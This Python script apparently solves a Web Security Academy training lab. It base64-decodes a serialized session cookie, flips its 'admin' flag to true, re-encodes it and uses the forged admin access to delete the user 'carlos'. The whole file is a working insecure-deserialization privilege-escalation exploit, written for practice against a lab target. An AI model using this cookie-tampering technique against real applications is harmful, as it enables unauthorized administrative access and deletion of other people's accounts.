from web_security_academy.core.logger import logger
from urllib.parse import quote, unquote
from base64 import b64encode, b64decode


def solve_lab(session):
    session.login("wiener", "peter", with_csrf=False)
    serial = unquote(session.cookies.get("session"))
    serial = b64decode(serial).decode()

    logger.info("Extracted the following serialized object from session cookie:")
    logger.info(serial)

    serial = serial.replace('"admin";b:0;', '"admin";b:1;')
    logger.info("Set the admin boolean from false to true:")
    logger.info(serial)

    cookie = b64encode(serial.encode())
    session.cookies.clear_session_cookies()
    session.cookies.set("session", quote(cookie.decode()))
    logger.info("Replaced the session cookie with the modified serialized object")

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
